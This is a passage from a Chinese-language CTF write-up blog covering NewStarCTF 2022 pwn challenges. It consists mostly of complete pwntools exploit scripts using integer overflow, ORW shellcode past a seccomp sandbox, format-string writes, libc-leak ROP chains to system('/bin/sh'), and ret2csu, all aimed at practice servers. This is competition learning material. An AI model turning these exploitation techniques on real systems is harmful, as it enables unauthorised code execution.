class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>puts_plt=base+libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&#x27;now input your addr:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-number">0x4033f8</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>))<br>se(p64(system))<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="WEEK2">WEEK2</h2><h3 id="uint32-and-ret">uint32 and ret:</h3><p>就是个负数转无符号会变为一个很大的数，就能溢出，然后太大也不行read不了，找一下64位无符号int是多少，然后对应减掉一点，用gdb调试一下就知道了，还有就是用ret调一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./uint&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25835</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br>ret=<span class="hljs-number">0x40101a</span><br>backdoor=<span class="hljs-number">0x4011b6</span><br>sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">4294967094</span>))<br><span class="hljs-comment">#debug()</span><br>sl(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+p64(ret)+p64(backdoor))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="shellcode-revenge：">shellcode-revenge：</h3><p>沙盒禁用了execve</p><p>保护就canary没开</p><p>思路：就是第一个read往mmap地址写 （调用read往mmap+21地址写0x800字节函数）的汇编（注：21是因为汇编长度为21），写入orw后会紧接着执行orw语句，<br>栈溢出跳到mmap</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25278</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br>mmap=<span class="hljs-number">0x233000</span><br>se(asm(shellcraft.read(<span class="hljs-number">0</span>,mmap+<span class="hljs-number">21</span>,<span class="hljs-number">0x800</span>)))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(asm(shellcraft.read(<span class="hljs-number">0</span>,mmap+<span class="hljs-number">21</span>,<span class="hljs-number">0x800</span>)))<br>orw_payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>orw_payload+=shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x850</span>,<span class="hljs-number">0x50</span>)   <br>orw_payload+=shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x850</span>,<span class="hljs-number">0x50</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(orw_payload))<br>sl(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(mmap))<br>sl(asm(orw_payload))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="砍一刀：">砍一刀：</h3><p>这题有格式化字符串漏洞</p><p>偏移为8</p><p>所以只要改diamond为10即可<br>diamond=0x404090<br>注意64位p64（diamond）要放在后面，不然要被截断<br>想了很久怎么去交互，这个脚本只能说极小概率成功，多试几次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28562</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;666&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>    sl(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    sl(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-string">&#x27;10&#x27;</span>+<span class="hljs-string">&#x27;c%10$n&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x404090</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="buffer-fly">buffer-fly:</h3><p>保护就canary没开</p><p><img src="/2022/11/16/newstarctf2022/1.png" alt="1"></p><p>printf遇到’\x00’截断，我们可以泄露在 rbp-0x20到rbp之间的地址</p><p>第一个read我们泄露函数的地址，得到gadget <code>pop_rdi</code>，<code>system</code></p><p>第二个read泄露栈的地址，填入<code>sh flag\x00</code></p><p>因为程序close(0),close(1)关闭了标准输入，标准输出</p><p>所以第三个read栈溢出sh执行flag，导致标准错误输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./buffer_fly&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28290</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>sea(<span class="hljs-string">&#x27;give me your name: &#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<br>ru(<span class="hljs-string">&#x27;your name: aaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)<br>function_addr=uu64(rc(<span class="hljs-number">6</span>))<br>boy_next_door=function_addr+<span class="hljs-number">3</span><br>base=boy_next_door-<span class="hljs-number">0x128e</span><br>info(<span class="hljs-string">&quot;function_base&quot;</span>,base)<br>pop_rdi=base+<span class="hljs-number">0x1423</span><br>ret=base+<span class="hljs-number">0x101a</span><br>system=base+<span class="hljs-number">0x129d</span><br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&#x27;your age: &#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>stack_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-comment">#debug()</span><br>info(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br>payload=flat(<span class="hljs-string">&#x27;sh flag\x00&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>,pop_rdi,stack_addr-<span class="hljs-number">0x30</span>,system)<br>sea(<span class="hljs-string">&#x27;susu give me your wechat number: &#x27;</span>,payload)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="WEEK3">WEEK3</h2><h3 id="cat-flag">cat flag</h3><p>提示趁它sleep时edit把name改为flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28863</span> )<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sla(<span class="hljs-string">&#x27;==&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Input the file name you want to cat.\n&#x27;</span>,<span class="hljs-string">&#x27;backdoor&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;==&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Input new name you want to change.\n&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="Read-Write">Read&amp;Write</h3><p>存在数组越界，和向后读写，可以向后越界泄露libc_base，程序实际地址什么的，然后rop一下就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br><br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    ru(<span class="hljs-string">&#x27;The num: &#x27;</span>)<br>    low_addr=<span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">10</span>)<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx+<span class="hljs-number">1</span>))<br>    ru(<span class="hljs-string">&#x27;The num: &#x27;</span>)<br>    high_addr=<span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">10</span>)<br>    <span class="hljs-keyword">return</span> high_addr*(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)+low_addr<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">w</span>(<span class="hljs-params">idx,num</span>):<br>    high_num=<span class="hljs-built_in">int</span>(num/(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>))<br>    low_num=num%(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)<br>    <span class="hljs-comment">#print(high_num)</span><br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Num:&#x27;</span>,<span class="hljs-built_in">str</span>(low_num))<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx+<span class="hljs-number">1</span>))<br>    sla(<span class="hljs-string">&#x27;Num:&#x27;</span>,<span class="hljs-built_in">str</span>(high_num))<br><span class="hljs-comment">#--------------------------</span><br>base=s(<span class="hljs-number">0x110</span>)-elf.sym[<span class="hljs-string">&#x27;__libc_csu_init&#x27;</span>]<br>info(<span class="hljs-string">&quot;base&quot;</span>,base)<br>libc_base=s(<span class="hljs-number">0x12c</span>)-<span class="hljs-number">0x236190</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br>pop_rdi = libc_base + <span class="hljs-number">0x23b6a</span><br>ret=libc_base + <span class="hljs-number">0x22679</span><br>binsh=libc_base+<span class="hljs-number">0x1B45BD</span><br>system =libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>w(<span class="hljs-number">0x106</span>,ret)<br>w(<span class="hljs-number">0x108</span>,pop_rdi)<br>w(<span class="hljs-number">0x10a</span>,binsh)<br><span class="hljs-comment">#debug()</span><br>w(<span class="hljs-number">0x10c</span>,system)<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2csu1">ret2csu1</h3><p>总而言之就是用ret2csu来rop出execve(“/bin/cat”,{“/bin/cat”,“/flag”,NULL},0)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select =<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br>elif select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27162</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = lambda data               :r.send(data) <br>sa      = lambda delim,data         :r.sendafter(delim, data)<br>sl      = lambda data               :r.sendline(data)<br>sla     = lambda delim,data         :r.sendlineafter(delim, data)<br>sea     = lambda delim,data         :r.sendafter(delim, data)<br>def debug(cmd=<span class="hljs-string">&#x27;&#x27;):</span><br><span class="hljs-string">     gdb.attach(r,cmd)</span><br><span class="hljs-string">     pause()</span><br><span class="hljs-string">#------------------------</span><br><span class="hljs-string">def csu(rdi,rsi,rdx,function):</span><br><span class="hljs-string">    csu_front_addr=0x400710</span><br><span class="hljs-string">    csu_end_addr=0x40072A</span><br><span class="hljs-string">    payload = b&#x27;</span>&#x27;<br>    payload += p64(csu_end_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(function) + p64(<br>        rdi) + p64(rsi) + p64(rdx)<br>    payload += p64(csu_front_addr)<br>    payload += b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-keyword">return</span> payload<br>#----------------<br>bincat=<span class="hljs-number">0x4007BB</span><br>flag=<span class="hljs-number">0x601050</span><br>execve=<span class="hljs-number">0x601068</span><br>payload=b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>*<span class="hljs-number">0x28</span>+csu(bincat,flag,<span class="hljs-number">0</span>,execve)<br><span class="hljs-meta">#debug()</span><br>sea(<span class="hljs-string">&#x27;I hide some useful text in this elf.Remember to check it!\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="sheep-a-flag">sheep a flag</h3><p>完全可以手动走一下迷宫，ctrl+c转换到脚本用格式化字符串往0x602080地址写0x1D4B42</p><p><a href="https://home.cnblogs.com/u/xyqer/">fmt</a>从这位师傅抄了一个，懒得写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./sheep_a_flag&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span 